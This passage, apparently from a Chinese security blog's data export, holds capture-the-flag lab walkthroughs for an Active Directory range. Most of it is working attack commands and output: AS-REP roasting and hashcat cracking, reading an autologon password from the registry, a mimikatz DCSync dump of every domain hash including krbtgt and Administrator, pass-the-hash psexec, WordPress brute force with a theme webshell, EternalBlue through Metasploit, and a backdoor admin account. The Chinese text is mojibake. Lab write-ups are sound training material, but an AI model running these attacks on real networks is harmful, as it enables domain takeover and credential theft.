Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) å¯ä»¥å¾—åˆ°äº†ä¸¤ä¸ªç”¨æˆ·çš„å¯†ç  1234$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0 ç”¨hashcatçˆ†ç ´ä¸€ä¸‹â””â”€# hashcat -m 18200 passhash /usr/share/wordlists/rockyou.txt 12$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa:hellokitty$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0:strawberry wenshao:hellokittyã€zhangxin:strawberry ç”¨bloodhoundè¿›è¡Œä¿¡æ¯æœé›† 12â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# bloodhound-python -u zhangxin -p strawberry -d xiaorang.lab -dc DC-PROGAME.xiaorang.lab -c all --dns-tcp -ns 172.22.6.12 --auth-method ntlm --zip å€Ÿä¸€å¼ å¤§ä½¬çš„å›¾ï¼Œå¯ä»¥çœ‹åˆ°WIN2019.XIAORANG.LABåˆ°&#x59;&#85;&#x58;&#85;&#x41;&#78;&#x40;&#88;&#x49;&#65;&#79;&#x52;&#65;&#78;&#x47;&#46;&#x4c;&#x41;&#66;æ˜¯æœ‰HasSessionçš„ï¼Œ HasSessionï¼šç”¨æˆ·ä¸è®¡ç®—æœºæ—¶è¿›è¡Œä¼šè¯æ—¶ï¼Œå‡­æ®ä¼šä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè¯´æ˜yuxuanè¿™ä¸ªç”¨æˆ·ç™»å½•è¿‡WIN2019 å¯ä»¥ç›´æ¥æŸ¥çœ‹æ³¨å†Œè¡¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344C:\\Users\\zhangxin\\Desktop&gt;reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon AutoRestartShell REG_DWORD 0x1 Background REG_SZ 0 0 0 CachedLogonsCount REG_SZ 10 DebugServerCommand REG_SZ no DisableBackButton REG_DWORD 0x1 EnableSIHostIntegration REG_DWORD 0x1 ForceUnlockLogon REG_DWORD 0x0 LegalNoticeCaption REG_SZ LegalNoticeText REG_SZ PasswordExpiryWarning REG_DWORD 0x5 PowerdownAfterShutdown REG_SZ 0 PreCreateKnownFolders REG_SZ &#123;A520A1A4-1780-4FF6-BD18-167343C5AF16&#125; ReportBootOk REG_SZ 1 Shell REG_SZ explorer.exe ShellCritical REG_DWORD 0x0 ShellInfrastructure REG_SZ sihost.exe SiHostCritical REG_DWORD 0x0 SiHostReadyTimeOut REG_DWORD 0x0 SiHostRestartCountLimit REG_DWORD 0x0 SiHostRestartTimeGap REG_DWORD 0x0 Userinit REG_SZ C:\\Windows\\system32\\userinit.exe, VMApplet REG_SZ SystemPropertiesPerformance.exe /pagefile WinStationsDisabled REG_SZ 0 ShellAppRuntime REG_SZ ShellAppRuntime.exe scremoveoption REG_SZ 0 DisableCAD REG_DWORD 0x1 LastLogOffEndTimePerfCounter REG_QWORD 0xedd7ccd15 ShutdownFlags REG_DWORD 0x80000027 AutoLogonSID REG_SZ S-1-5-21-3623938633-4064111800-2925858365-1180 LastUsedUsername REG_SZ yuxuan AutoAdminLogon REG_SZ 1 DefaultUserName REG_SZ yuxuan DefaultPassword REG_SZ Yuxuan7QbrgZ3L DefaultDomainName REG_SZ xiaorang.labHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AlternateShellsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensionsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserDefaultsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoLogonCheckedHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\VolatileUserMgrKey 123DefaultUserName REG_SZ yuxuan DefaultPassword REG_SZ Yuxuan7QbrgZ3L DefaultDomainName REG_SZ xiaorang.lab yuxuanç”¨æˆ·æ»¥ç”¨äº†SIDå†å²åŠŸèƒ½(SIDHistoryæ˜¯ä¸€ä¸ªä¸ºæ”¯æŒåŸŸè¿ç§»æ–¹æ¡ˆè€Œè®¾ç½®çš„å±æ€§ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ä»ä¸€ä¸ªåŸŸè¿ç§»åˆ°å¦ä¸€ä¸ªåŸŸæ—¶ï¼Œä¼šåœ¨æ–°åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„SIDä½œä¸ºè¯¥å¯¹è±¡çš„objectSidï¼Œåœ¨ä¹‹å‰åŸŸä¸­çš„SIDä¼šæ·»åŠ åˆ°è¯¥å¯¹è±¡çš„sIDHistoryå±æ€§ä¸­ï¼Œæ­¤æ—¶è¯¥å¯¹è±¡å°†ä¿ç•™åœ¨åŸæ¥åŸŸçš„SIDå¯¹åº”çš„è®¿é—®æƒé™ å…ˆç™»å½•yuxuanç”¨æˆ·ï¼Œç„¶åç”¨mimikatzæŠ“å–administratorçš„å“ˆå¸Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293C:\\Users\\yuxuan\\Desktop&gt;mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot; .#####. mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36 .## ^ ##. &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#x27;## v ##&#x27; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#x27;#####&#x27; &gt; http://pingcastle.com / http://mysmartlogon.com ***/mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC-PROGAME.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;1103 shuzhen 07c1f387d7c2cf37e0ca7827393d2327 5121104 gaiyong 52c909941c823dbe0f635b3711234d2e 5121106 xiqidi a55d27cfa25f3df92ad558c304292f2e 5121107 wengbang 6b1d97a5a68c6c6c9233d11274d13a2e 5121108 xuanjiang a72a28c1a29ddf6509b8eabc61117c6c 5121109 yuanchang e1cea038f5c9ffd9dc323daf35f6843b 5121110 lvhui f58b31ef5da3fc831b4060552285ca54 5121111 wenbo 9abb7115997ea03785e92542f684bdde 5121112 zhenjun 94c84ba39c3ece24b419ab39fdd3de1a 5121113 jinqing 4bf6ad7a2e9580bc8f19323f96749b3a 5121115 yangju 1fa8c6b4307149415f5a1baffebe61cf 5121117 weicheng 796a774eace67c159a65d6b86fea1d01 5121118 weixian 8bd7dc83d84b3128bfbaf165bf292990 5121119 haobei 045cc095cc91ba703c46aa9f9ce93df1 5121120 jizhen 1840c5130e290816b55b4e5b60df10da 5121121 jingze 3c8acaecc72f63a4be945ec6f4d6eeee 5121122 rubao d8bd6484a344214d7e0cfee0fa76df74 5121123 zhaoxiu 694c5c0ec86269daefff4dd611305fab 5121124 tangshun 90b8d8b2146db6456d92a4a133eae225 5121125 liangliang c67cd4bae75b82738e155df9dedab7c1 5121126 qiyue b723d29e23f00c42d97dd97cc6b04bc8 5121127 chouqian c6f0585b35de1862f324bc33c920328d 5121128 jicheng 159ee55f1626f393de119946663a633c 5121129 xiyi ee146df96b366efaeb5138832a75603b 5121130 beijin a587b90ce9b675c9acf28826106d1d1d 5121131 chenghui 08224236f9ddd68a51a794482b0e58b5 5121132 chebin b50adfe07d0cef27ddabd4276b3c3168 5121133 pengyuan a35d8f3c986ab37496896cbaa6cdfe3e 5121134 yanglang 91c5550806405ee4d6f4521ba6e38f22 5121135 jihuan cbe4d79f6264b71a48946c3fa94443f5 5121136 duanmuxiao 494cc0e2e20d934647b2395d0a102fb0 5121137 hongzhi f815bf5a1a17878b1438773dba555b8b 5121138 gaijin b1040198d43631279a63b7fbc4c403af 5121139 yifu 4836347be16e6af2cd746d3f934bb55a 5121140 fusong adca7ec7f6ab1d2c60eb60f7dca81be7 5121141 luwan c5b2b25ab76401f554f7e1e98d277a6a 5121142 tangrong 2a38158c55abe6f6fe4b447fbc1a3e74 5121143 zhufeng 71e03af8648921a3487a56e4bb8b5f53 5121145 dongcheng f2fdf39c9ff94e24cf185a00bf0a186d 5121146 lianhuangchen 23dc8b3e465c94577aa8a11a83c001af 5121147 lili b290a36500f7e39beee8a29851a9f8d5 5121148 huabi 02fe5838de111f9920e5e3bb7e009f2f 5121149 rangsibo 103d0f70dc056939e431f9d2f604683c 5121150 wohua cfcc49ec89dd76ba87019ca26e5f7a50 5121151 haoguang 33efa30e6b3261d30a71ce397c779fda 5121152 langying 52a8a125cd369ab16a385f3fcadc757d 5121153 diaocai a14954d5307d74cd75089514ccca097a 5121154 lianggui 4ae2996c7c15449689280dfaec6f2c37 5121155 manxue 0255c42d9f960475f5ad03e0fee88589 5121156 baqin 327f2a711e582db21d9dd6d08f7bdf91 5121157 chengqiu 0d0c1421edf07323c1eb4f5665b5cb6d 5121158 louyou a97ba112b411a3bfe140c941528a4648 5121159 maqun 485c35105375e0754a852cee996ed33b 5121160 wenbiao 36b6c466ea34b2c70500e0bfb98e68bc 5121161 weishengshan f60a4233d03a2b03a7f0ae619c732fae 5121163 chuyuan 0cfdca5c210c918b11e96661de82948a 5121164 wenliang a4d2bacaf220292d5fdf9e89b3513a5c 5121165 yulvxue cf970dea0689db62a43b272e2c99dccd 5121166 luyue 274d823e941fc51f84ea323e22d5a8c4 5121167 ganjian 7d3c39d94a272c6e1e2ffca927925ecc 5121168 pangzhen 51d37e14983a43a6a45add0ae8939609 5121169 guohong d3ce91810c1f004c782fe77c90f9deb6 5121170 lezhong dad3990f640ccec92cf99f3b7be092c7 5121171 sheweiyue d17aecec7aa3a6f4a1e8d8b7c2163b35 5121172 dujian 8f7846c78f03bf55685a697fe20b0857 5121173 lidongjin 34638b8589d235dea49e2153ae89f2a1 5121174 hongqun 6c791ef38d72505baeb4a391de05b6e1 5121175 yexing 34842d36248c2492a5c9a1ae5d850d54 5121176 maoda 6e65c0796f05c0118fbaa8d9f1309026 5121177 qiaomei 6a889f350a0ebc15cf9306687da3fd34 512502 krbtgt a4206b127773884e2c7ea86cdd282d9c 514500 Administrator 04d93ffd6f5f6e4490e0de23f240a5e9 5121000 DC-PROGAME$ b1f83a8f5daf6f7825f6a69d98c8f364 5324801180 yuxuan 376ece347142d1628632d440530e8eed 660481181 WIN2019$ 5447da4f138ae51f887cf24e79a9eba3 40961178 wenshao b31c6aa5660d6e87ee046b1bb5d0ff79 42603521179 zhangxin d6c5976e07cdb410be19b84126367e3d 4260352mimikatz(commandline) # exitBye! æœ‰äº†administratorçš„å¯†ç äº†ï¼Œå°±ç›¸å½“äºæ§åˆ¶åŸŸæ§äº†ï¼Œç™»å½•ä¸€ä¸‹å…¶ä»–çš„æœºå™¨type flagå°±è¡Œäº† FLAG3ã€4flag03åœ¨172.22.6.25çš„C:\\Users\\Administrator\\flag\\ä¸‹ flag04åœ¨172.22.6.12çš„C:\\Users\\Administrator\\flag\\ä¸‹ 123456789101112131415161718192021222324252627282930313233â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-psexec xiaorang.lab/administrator@172.22.6.12 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -codec gbkImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.6.12.....[*] Found writable share ADMIN$[*] Uploading file FFcjQxtS.exe[*] Opening SVCManager on 172.22.6.12.....[*] Creating service kiNB on 172.22.6.12.....[*] Starting service kiNB.....[!] Press help for extra shell commandsMicrosoft Windows [ç‰ˆæœ¬ 10.0.14393](c) 2016 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag*â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-psexec xiaorang.lab/administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -codec gbkImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.6.25.....[*] Found writable share ADMIN$[*] Uploading file GRqsuULo.exe[*] Opening SVCManager on 172.22.6.25.....[*] Creating service VUIl on 172.22.6.25.....[*] Starting service VUIl.....[!] Press help for extra shell commandsMicrosoft Windows [ç‰ˆæœ¬ 10.0.17763.3046](c) 2018 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag*","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-2022ç½‘é¼æ¯åŠå†³èµ›å¤ç›˜","slug":"æ˜¥ç§‹äº‘é•œ-2022ç½‘é¼æ¯åŠå†³èµ›å¤ç›˜","date":"2025-04-02T06:04:44.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/02/æ˜¥ç§‹äº‘é•œ-2022ç½‘é¼æ¯åŠå†³èµ›å¤ç›˜/","permalink":"https://lvzhouhang.xyz/2025/04/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/","excerpt":"","text":"1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 39.98.112.16 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 02:06 EDTNmap scan report for 39.98.112.16Host is up (0.00020s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 135.21 seconds åªå¼€äº†ä¸€ä¸ª 22 ç«¯å£å’Œ 80 ç«¯å£ è®¿é—® 80 ç«¯å£ï¼Œå¾ˆæ˜æ˜¾çš„ wordpress æ¡†æ¶ ç”¨ wpscan æ‰«æå¯ä»¥æ‰«æåˆ°ä¸€ä¸ª admin ç”¨æˆ·ï¼Œçˆ†ç ´å¯†ç å¯ä»¥çˆ†ç ´å‡ºæ¥ admin çš„å¯†ç æ˜¯ 123456 12[!] Valid Combinations Found: | Username: admin, Password: 123456 è¿›å…¥åå°ä¹‹åä¿®æ”¹ä¸»é¢˜æ–‡ä»¶ getshell è®¿é—®/wp-content/themes/twentytwentyone/404.phpï¼Œèšå‰‘è¿æ¥ flag01 åœ¨æ ¹ç›®å½• æŸ¥çœ‹ç½‘ç»œä¿¡æ¯ï¼Œç„¶åä¸Šä¼  fscan è¿›è¡Œå†…ç½‘æ‰«æ 12345678910111213(www-data:/tmp) $ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 :: 1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e: 2d: a8: bd brd ff: ff: ff: ff: ff: ff inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 1892159075sec preferred_lft 1892159075sec inet6 fe80:: 216:3eff: fe2d: a8bd/64 scope link valid_lft forever preferred_lft forever 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768$ ./fscan -h 172.22.15.26/16 -time 10 ___ _ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ // /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt;\\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.15.13 is alive(icmp) Target 172.22.15.18 is alive(icmp) Target 172.22.15.24 is alive(icmp) Target 172.22.15.35 is alive[*] Icmp alive hosts len is: 4172.22.15.24:3306 open172.22.15.35:445 open172.22.15.13:445 open172.22.15.18:445 open172.22.15.35:139 open172.22.15.24:139 open172.22.15.18:139 open172.22.15.13:139 open172.22.15.35:135 open172.22.15.24:135 open172.22.15.13:135 open172.22.15.18:135 open172.22.15.24:80 open172.22.15.18:80 open172.22.15.24:445 open172.22.15.13:88 open[*] alive ports len is: 16start vulscan[*] NetInfo:[*]172.22.15.24 [-&gt;] XR-WIN08 [-&gt;] 172.22.15.24[*] NetInfo:[*]172.22.15.35 [-&gt;] XR-0687 [-&gt;] 172.22.15.35[*] NetBios: 172.22.15.35 XIAORANG\\XR-0687[*] NetInfo:[*]172.22.15.18 [-&gt;] XR-CA [-&gt;] 172.22.15.18[*] NetInfo:[*]172.22.15.13 [-&gt;] XR-DC01 [-&gt;] 172.22.15.13[+] 172.22.15.24 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] 172.22.15.13 (Windows Server 2016 Standard 14393)[*] NetBios: 172.22.15.13 [+]DC XR-DC01.xiaorang.lab Windows Server 2016 Standard 14393[*] NetBios: 172.22.15.24 WORKGROUP\\XR-WIN08 Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] Webtoc: truetitle: http://172.22.15.18 code: 200 len: 703 toc: truetitle: IIS Windows Server[*] NetBios: 172.22.15.18 XR-CA.xiaorang.lab Windows Server 2016 Standard 14393[*] Webtoc: truetitle: http://172.22.15.24 code: 302 len: 0 toc: truetitle: None è·³è½¬ url: http://172.22.15.24/www[*] Webtoc: truetitle: http://172.22.15.24/www/sys/index.php code: 200 len: 135 toc: truetitle: None[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detectå·²å®Œæˆ 16/16[*] æ‰«æç»“æŸ, è€—æ—¶: 23.238579924s å¯ä»¥å‘ç° 172.22.15.24 å­˜åœ¨ MS17-010 æ¼æ´ï¼Œç›´æ¥ä¸Š msfï¼Œä½†æ˜¯ç”¨ msf æ¢­å“ˆä¹‹å‰éœ€è¦å…ˆæ­å»ºä¸€å±‚ä»£ç†ï¼Œå¯ä»¥ç”¨ Venom æ­å»ºå¾ˆæ–¹ä¾¿ 12345proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpset rhosts 172.22.15.24exploit flag02 åœ¨ C:\\users\\administrator\\flag é‡Œï¼Œæ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ç„¶åè¿œç¨‹æ¡Œé¢è¿æ¥ 12net user ll Asd123123 /addnet localgroup administrators ll /add å¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„å¯†ç ï¼Œè¿™ä¸ªç«™ç‚¹è¿˜å­˜åœ¨ä¸€ä¸ª phpmyadminï¼Œå°è¯•ç™»å½• root:root@#123ï¼Œå°† zdoo åº“é‡Œé¢çš„ user è¡¨å¯¼å‡ºæ¥ 123456789101112131415161718#åŸŸå†…ç”¨æˆ·lixiuying@xiaorang.labjiaxiaoliang@xiaorang.labwanglihong@xiaorang.labhuachunmei@xiaorang.labzhangxinyu@xiaorang.labhuzhigang@xiaorang.lablihongxia@xiaorang.labwangyulan@xiaorang.labchenjianhua@xiaorang.labzhangyi@xiaorang.labzhangli@xiaorang.labzhangwei@xiaorang.labliuqiang@xiaorang.labwangfang@xiaorang.labwangwei@xiaorang.lablixiaoliang@xiaorang.labwanghao@xiaorang.lab å°†è·å¾—çš„è´¦å·æ”¾è¿› user.txt é‡Œ ä½¿ç”¨ AS-REP Roasting æ”»å‡»ï¼Œå°è¯•è·å–ç”¨æˆ·çš„å¯†ç  1234567891011121314151617181920212223242526â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile users.txt -format hashcat[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies/usr/share/doc/python3-impacket/examples/GetNPUsers.py: 165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:28dc48860e014c6d18a29bad65ba6cc8$ b6924f808e7a4d56bd403bc0e5286ad6b1cb1a39ee59331e484a90801fa82bbcb6b685236b61c5976a05330006b74f304fcfb56793de9c78d38caa16075bef947ad898c8b1130dad240a8298a98e86f18af90cebb015502c7758d6a32c366a42395d08877902d303ee0662540653b3c87c14d6d5319b63e5c5eaf6250d7e82d48d57afc56492344b618b054d6a75cf5ee014f00e92311479dba0ccb54c77b072213a42b79862f913a77a6b0fae4f9a67755ca83b583220c30b6f77296098c71bb42a2cbd8197bcd4e30598ecfbf519899b44cc5d723a4a49fc26db1a4b678a1afd4acea4b42b72949e677edd[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:2fad79d14745c573303bd34c39f80e7f$ 0d9522fc4669f0e04b80e36cef3370c1cce5e232e2b131d6d652c7e2dad452a86918cfbd25e78a701896943ba6b50e241f27b8af4b5d79cffef11fd4ee2392325a468f8ff648e70a74e7d9d2ce58990dc91b36a5c84c2ffa7f45e7cdd852dc2a8df1e5e2f9491eb5c5753cdf54cac6cc2eed2a8b9b58c3693b058fcb6a6187ae49c4d80732aa40e0e3296313962128d414b85f75cb87af301ca39664fffc192e1b62755178c4c6b8f13dd70ff912c4f637a970f33bc367e84e4c1dcb31ade4a20b0bdf8bd7c64c19adf091f4850a8ea2c7a7428bbcb17ef7c87e02ae3b5f9637902612ba8fbe65b7599a7d7e[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User lihongxia@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User wangyulan@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User chenjianhua@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) è¿”å›äº†ä¸¤ä¸ªç¥¨æ®, ç”¨ hashcat çˆ†ç ´ 12345â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# hashcat -m 18200 user.txt /usr/share/wordlists/rockyou.txt --show[proxychains] DLL init: proxychains-ng 4.17$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:dbd1dee4c07eea9541a9f1af91b93180$ b4d238908b8d37009f9dfb5402a13f1b60567f4f8185fbbf5c9fbefe14bbe0b1f89980cd604ff68b572afe6af2d1bb4d6720abc8bdc51e47df9da3ebb4801d08f8be90c12343699eff8855dbfc0d63e796ffcec62169fa4e3ee97440ca0eb2eb985e6785f93aa1d34444235b1ce8937acf0121fe05ec2c589ba625fab1c90bd168637124f99378007fa9c459b07f946a65d3c7131cdad16af4b591becc04526125e2c255072df4a32214d393aab5f27cff28b66859c1b9bb06600d4c7a51cd7ae583d4602fd1ebd6ffc269ee60ed861abb28bb547de5e848955d5279d9e08523edb67fbd171d1af1730f2fba: winniethepooh$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:c640ad4dd669f00b128bad8d1ef8df86$ 0b8e74c7b36ec7daceb707ce176d18a8d15f8cd3ba3154f8ae4f29e9e54f538ab19bc766ea554698677d7f1e6f9418fd7419d82a1ca79582ed70f3de5b5c771a6e7df373fc84a9921b697e7c7d42c17e85f1b2ae73b1ec15bf1bbc59e20bfb2d4e5e52c53c1e88da9c0815434acd8298948f7becb0f15bfdcce4153d025570249523f7507c20f694f5e0ec23c8e7ef5d446aa5fec15315ab314658fc36befc39d7cdf037fa1f165a83ab257fa34a17c4b512ccca27284b97d8f7bdf51cdb0a069e2df4f952c3c52fa47fb58a0fe4e80d0907062fad92edf4d799306ddb103468accf1c2a6b172f2bd7d7c61d: 1qaz2wsx ç”¨ bloodhound è¿›è¡ŒåŸŸå†…ä¿¡æ¯æœé›† 1234567891011121314151617181920â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -dc XR-DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.15.13 --auth-method ntlm --zipINFO: Found AD domain: xiaorang.labINFO: Connecting to LDAP server: XR-DC01.xiaorang.labINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 3 computersINFO: Connecting to LDAP server: XR-DC01.xiaorang.labINFO: Found 37 usersINFO: Found 53 groupsINFO: Found 2 gposINFO: 